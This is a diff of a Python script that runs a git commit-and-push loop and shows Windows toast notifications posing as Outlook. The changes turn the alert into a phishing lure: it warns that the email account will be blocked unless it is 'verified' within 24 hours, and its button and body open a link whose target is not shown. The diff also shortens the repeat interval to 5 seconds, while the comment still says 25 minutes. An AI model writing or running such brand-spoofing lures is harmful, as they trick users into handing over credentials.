@@ -18,7 +18,7 @@ def notificar(titulo, mensagem):
     )
 
     # 🔗 botão
-    toast.add_actions(label="Entrar", launch=LINK)
+    toast.add_actions(label="Verifique sua conta.", launch=LINK)
 
     # 🔗 clicar na notificação inteira
     toast.launch = LINK
@@ -37,9 +37,9 @@ def fazer_push():
     else:
         run(f'git commit -m "{msg}"')
         run(f"git push origin {BRANCH}")
-        notificar("Outlook", "Conta Outlook Bloqueada!")
+        notificar("Outlook", "Este e-mail será bloqueado.Essa verificação é rápida e obrigatóriaVocê deve efetua-lá em no máximo em 24 horas.")
 
 # 🔁 roda a cada 25 minutos
 while True:
     fazer_push()
-    time.sleep(15)
+    time.sleep(5)
